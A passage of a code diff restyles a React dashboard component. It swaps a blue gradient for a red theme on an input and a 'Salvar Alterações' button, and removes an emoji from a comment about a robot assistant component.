+                      className="w-full bg-slate-950 border border-[#24242a] focus:border-[#2a2a31]/50 focus:ring-1 focus:ring-[#ef4444]/35 rounded-md px-4 py-2 text-sm text-white transition-all outline-none placeholder:text-[#24242a]"
                     />
                   </div>
                 </div>
@@ -1415,7 +1361,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
               <button 
                 type="submit"
                 disabled={isSavingProfile}
-                className="w-full py-2.5 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-700 hover:to-cyan-600 text-white rounded-xl text-xs font-bold uppercase tracking-wider shadow-[0_0_15px_rgba(220,38,38,0.2)] transition-all flex items-center justify-center gap-2"
+                className="w-full py-2.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] rounded-md text-xs font-bold uppercase tracking-wider shadow-[0_0_15px_rgba(239,68,68,0.2)] transition-all flex items-center justify-center gap-2"
               >
                 {isSavingProfile ? 'Salvando...' : 'Salvar Alterações'}
               </button>
@@ -1436,9 +1382,10 @@ export default function Dashboard({ onLogout }: DashboardProps) {
         />
       )}
 
-      {/* 🤖 ROBÔ ASSISTENTE ANIMADO & TUTORIAL */}
+      {/*  ROBÔ ASSISTENTE ANIMADO & TUTORIAL */}
       <RobotAssistant />
 
     </div>
   );
 }
+
